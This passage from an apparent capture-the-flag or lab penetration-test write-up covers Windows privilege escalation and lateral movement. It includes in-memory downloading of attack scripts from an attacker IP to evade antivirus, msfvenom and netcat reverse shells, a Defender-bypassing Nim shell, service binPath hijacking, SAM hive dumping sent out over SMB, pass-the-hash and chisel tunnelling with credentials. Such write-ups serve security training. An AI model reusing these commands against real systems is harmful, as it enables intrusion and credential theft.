SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing interesting.

Uploading winpeas worked, but it does not execute.

Let’s upload accesschk.exe and check whether we can change any binary’s path. 

We find this post about Windows Service permissions. https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107

Let’s upload PowerUp.ps1. To attempt to evade Anti-Virus, let’s load it straight into memory:

```bash
IEX (New-Object Net.WebClient).downloadString("http://10.10.16.5:443/PowerUp.ps1")

+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand

```

Did not work. 

Back on Zabbix server, we enable the hosts:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2073.png)

Let’s try another script: https://github.com/itm4n/PrivescCheck

```bash
IEX (New-Object Net.WebClient).downloadString("http://10.10.16.5:443/PrivescCheck.ps1")

Invoke-PrivescCheck 
```

Interesting outputs:

```bash
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
┃ NAME     ┃ Services - Permissions                            ┃
┃ TYPE     ┃ Base                                              ┃
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Check whether the current user has any write permissions on  ┃
┃ a service through the Service Control Manager (SCM).         ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

Name              : wuauserv
DisplayName       : @C:\Windows\system32\wuaueng.dll,-105
User              : LocalSystem
ImagePath         : C:\Windows\system32\svchost.exe -k netsvcs -p
StartMode         : Manual
Type              : Win32ShareProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\wuauserv
Status            : Stopped
UserCanStart      : False
UserCanStop       : False
IdentityReference : internal\Service Management (S-1-5-21-3056178012-3972705859-491075245-6613)
Permissions       : AllAccess

[*] Status: Vulnerable - Severity: High - Execution time: 00:00:02.292

```

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:443/Get-ServiceAcl.ps1')

"wuauserv" | Get-ServiceAcl | select -ExpandProperty Access

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac, WriteOwner
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac, WriteOwner
AccessControlType : AccessAllowed
IdentityReference : BUILTIN\Administrators
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, QueryStatus, EnumerateDependents, Interrogate, UserDefinedControl, ReadControl
AccessControlType : AccessAllowed
IdentityReference : NT AUTHORITY\INTERACTIVE
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

ServiceRights     : QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Start, Stop, PauseContinue, Interrogate, UserDefinedControl, Delete, ReadControl, WriteDac, WriteOwner
AccessControlType : AccessAllowed
IdentityReference : internal\Service Management
IsInherited       : False
InheritanceFlags  : None
PropagationFlags  : None

```

It seems like we have all access to wuauserv service. Let’s change it’s ImagePath to a reverse shell and start the service.

First, we generate our meterpreter reverse shell:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f exe -o rev.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe

```

Let’s upload it:

```bash
upload rev.exe

#did not work

wget http://10.10.16.5:443/rev.exe -O rev.exe
```

Now let’s change the binPath

```bash
sc.exe config wuauserv binPath="cmd.exe /c C:\programdata\rev.exe"

[SC] ChangeServiceConfig SUCCESS
```

Now start our listener:

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 443
set payload windows/x64/meterpreter/reverse_tcp
run
```

Now stop and start service:

```bash
*Evil-WinRM* PS C:\programdata> sc.exe stop wuauserv 
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\programdata> sc.exe start wuauserv 
[SC] StartService: OpenService FAILED 1060:

The specified service does not exist as an installed service.

```

Did not work. 

Let’s test whether our msfvenom reverese shell is actually executing:

```bash
.\rev.exe

Program 'rev.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\rev.exe
+ ~~~~~~~~~.
At line:1 char:1
+ .\rev.exe
+ ~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Let’s try executing a nc.exe connection.

```bash
.\nc.exe 10.10.16.5 443 -e cmd.exe

Program 'nc.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\nc.exe 10.10.16.5 443 -e cmd.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\nc.exe 10.10.16.5 443 -e cmd.exe
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

Searching up “reverse shell bypass defender”, we come across this:

[https://github.com/Sn1r/Nim-Reverse-Shell](https://github.com/Sn1r/Nim-Reverse-Shell)

Let’s download it and compile it:

```bash
nim c -d:mingw --app:gui rev_shell.nim
```

Now let’s upload:

```bash
#on evil-winrm session
upload rev_shell.exe
```

When we execute now, we get a connection back. Let’s change the binpath to our new reverse shell:

```bash
sc.exe config wuauserv binPath="cmd.exe /c C:\programdata\rev_shell.exe"
```

Now let’s execute again:

```bash
sc.exe start wuauserv 
```

We are now SYSTEM on HR machine:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2074.png)

Let’s dump SAM, SYSTEM and SECURITY.

```bash
C:\WINDOWS\system32> reg.exe save hklm\sam C:\programdata\sam

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\programdata\system

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\programdata\security

The operation completed successfully.
```

Now let’s start a SMB server:

```bash
sudo impacket-smbserver share -smb2support . -user test -password test
```

Now let’s connect and transfer the file:

```bash
net use \\10.10.16.5\share /user:test test

C:\> move sam \\10.10.16.5\share
        1 file(s) moved.

C:\> move security \\10.10.16.5\share
        1 file(s) moved.

C:\> move system \\10.10.16.5\share
        1 file(s) moved.
```

Now let’s dump the passwords:

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:724cf89458d481e0975359f3e4cf570c:::
<SNIP>
```

Let’s also dump LSA:

```bash
nxc winrm 192.168.210.17 -u Administrator -H 724cf89458d481e0975359f3e4cf570c --lsa
```

Let’s logon:

```bash
evil-winrm -u Administrator -H 724cf89458d481e0975359f3e4cf570c -i 192.168.210.17
```

## 192.168.210.18 ZPH-SVRCSUP.INTERNAL.ZSM.LOCAL

```bash
sudo nmap -sC -sV -oN nmap/ZPH-SVRCSUP 192.168.210.18 

Host is up (0.00031s latency).
All 1000 scanned ports on ZPH-SVRCSUP (192.168.210.18) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.39 seconds

```

Let’s scan UDP:

```bash
sudo nmap -sU -p 161,162 192.168.210.18
```

Nothing. Let’s perform all port scan:

```bash
sudo nmap -p- 192.168.210.18 -v --min-rate=10000

```

Nothing. No UDP either. 

Let’s try pinging from all hosts, see which one can reach:

```bash
# does not work.
ZPH-SVRCA01 .12
FS .14
DC01 .10
internal dc01 .16 
zabbix server .13
sql02 .19
sql01 .15
mgmt .18
HR .17
```

Let’s test connection from HR:

```bash
**Test-NetConnection 192.168.210.18 -Port 445**
```

Let’s check winrm connection from HR:

```bash
Test-NetConnection 192.168.210.18 -Port 5985

ComputerName     : 192.168.210.18
RemoteAddress    : 192.168.210.18
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.210.17
TcpTestSucceeded : True

```

Looks like we can connect from SUP. 

We also know from bloodhound, melissa is part of the support group. Maybe we can use her credential to log on. 

Let’s setup another chisel tunnel to try and reach internal network. We know the firewall blocks off all ports but HTTPS. Let’s start a chisel server on [localhost](http://localhost) on port 443:

```bash
./chisel server -p 443 -reverse -v --socks5
```

Now upload chisel and connect:

```bash
.\chisel.exe client -v 10.10.16.5:443 R:socks

chisel.exe : 2025/12/02 12:57:26 client: Connecting to ws://10.10.16.5:443
    + CategoryInfo          : NotSpecified: (2025/12/02 12:5.../10.10.16.5:443:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2025/12/02 12:57:26 client: Handshaking...2025/12/02 12:57:26 client: Sending config2025/12/02 12:57:26 client: Connected (Latency 17.9351ms)2025/12/02 12:57:26 client: tun: SSH connectedD
```

Now let’s use proxychains to login:

```bash
proxychains evil-winrm -u melissa -p 'WinterIsHere2022!' -i 192.168.210.18
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2075.png)

We are in. 

Let’s check who are the local administrators on this machine:

```bash
net localgroup Administrators

<SNIP>
internal\Melissa
```

Now we can get the flag.

## 192.168.210.14 ZPH-SVRADFS1

```bash
sudo nmap -sC -sV 192.168.210.14 -oN nmap/SVRADFS1
```

```bash
Nmap scan report for ZPH-SVRADFS1 (192.168.210.14)                                                                                             
Host is up (0.060s latency).                                                                                                                   
Not shown: 996 filtered tcp ports (no-response)                                                                                                
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
135/tcp  open  msrpc         Microsoft Windows RPC
443/tcp  open  https?
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
           
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2076.png)

This computer can read GMSA password.

```bash
bloodyAD -u jamie -p 'P@ass123' -d zsm.local --host 192.168.210.10 add groupMember 'CA Managers' jamie

nxc smb 192.168.210.14 -u jamie -p 'P@ass123' --shares
```

We carry on exploitation from ZPH-SVRDC01.